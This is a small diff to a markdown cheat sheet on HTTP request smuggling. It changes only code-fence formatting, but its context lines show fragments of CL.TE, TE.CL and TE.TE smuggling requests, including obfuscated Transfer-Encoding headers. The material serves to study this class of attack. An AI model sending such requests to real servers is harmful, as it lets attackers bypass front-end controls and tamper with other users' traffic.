@@ -19,7 +19,7 @@
 
 1. HTTP/1.1
     1. CL.TE
-       ```http
+       ```
        POST / HTTP/1.1
        Host: vulnerable-website.com
        Content-Length: 13               --> Content length is 13 which includes smuggled
@@ -30,7 +30,7 @@
        SMUGGLED               
        ```
     2. TE.CL
-         ```http
+         ```
        POST / HTTP/1.1
        Host: vulnerable-website.com
        Content-Length: 3               --> Content length is 3 which includes the 8
@@ -42,7 +42,7 @@
        ```
     3. TE.TE
        - You need to obfuscate the Transfer-Encoding header so that one server does not process it
-        ```http
+        ```
         Transfer-Encoding: xchunked
         Transfer-Encoding : chunked
         Transfer-Encoding: chunked
